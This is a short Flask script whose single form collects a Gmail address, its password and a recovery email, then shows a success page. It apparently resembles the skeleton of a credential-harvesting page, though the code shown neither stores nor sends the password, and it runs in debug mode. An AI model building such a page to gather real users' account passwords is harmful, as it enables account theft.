from flask import Flask, render_template, request

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def form():
    if request.method == "POST":
        gmail = request.form.get("gmail")
        password = request.form.get("password")
        recovery_email = request.form.get("recovery_email")
        return render_template("success.html", gmail=gmail, recovery_email=recovery_email)
    return render_template("form.html")

if __name__ == "__main__":
    app.run(debug=True)
